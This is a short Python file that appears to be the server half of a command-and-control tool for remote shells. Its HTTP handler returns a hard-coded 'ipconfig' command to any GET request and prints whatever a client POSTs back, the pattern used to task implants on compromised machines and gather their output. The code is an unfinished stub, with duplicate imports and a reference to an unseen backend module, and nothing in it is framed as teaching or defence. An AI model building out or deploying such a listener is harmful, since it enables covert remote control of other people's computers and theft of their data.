import socket
import http.server
import socketserver
import logging
import termcolor
import atexit
import os
import readline
import rlcompleter
import datetime
import threading
import multiprocessing
import logging
import sys
import termcolor
from termcolor import colored
from cmd import Cmd


from backend.Interact import HTTPinteracting



class http_sHandler(http.server.BaseHTTPRequestHandler):



    def do_GET(s):

        UserCommandinput = str("ipconfig")

        command = bytes(UserCommandinput.encode())
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command)


    def do_POST(s):

        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length']) #
        postVar = s.rfile.read(length)
        #if b'' in postVar == False:
        print(postVar)
